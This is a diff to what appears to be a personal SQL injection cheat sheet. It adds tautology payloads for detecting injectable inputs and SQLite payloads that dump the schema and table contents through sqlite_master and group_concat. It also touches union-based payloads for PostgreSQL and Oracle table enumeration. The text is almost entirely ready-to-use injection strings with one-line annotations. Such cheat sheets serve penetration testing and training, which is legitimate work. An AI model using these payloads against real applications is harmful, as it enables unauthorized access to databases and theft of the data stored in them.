@@ -1,3 +1,11 @@
+#Determinig SQLi Vulnerablity
+
+1 or 1=1-- - >> Input box non string.
+
+1' or 1=1-- - >> Input box string.
+
+
+
 #Determining column numbers
 
 ' order by 1-- -
@@ -24,11 +32,25 @@
 
 
 
+#SQLite Database info retrieving
+
+sqlite_version()
+
+(SELECT group_concat(tbl_name) FROM sqlite_master)
+
+(SELECT sql FROM sqlite_master) >> Useful to retrieve all table and column in a single payload.
+
+(SELECT group_concat([column name here]) from [table name here])
+
+(SELECT group_concat(column1 || "," || column2 || "," || column3 || ":") from [table name here]) >> To retrieve multiple columns data. 
+
+
+
 #To fetch table name
 
 ' union SELECT table_name,null FROM information_schema.tables-- - >> PostgreSQL
 
-' union SELECT table_name,null FROM all_tables-- - Oracle
+' union SELECT table_name,null FROM all_tables-- - >> Oracle
 
 
 
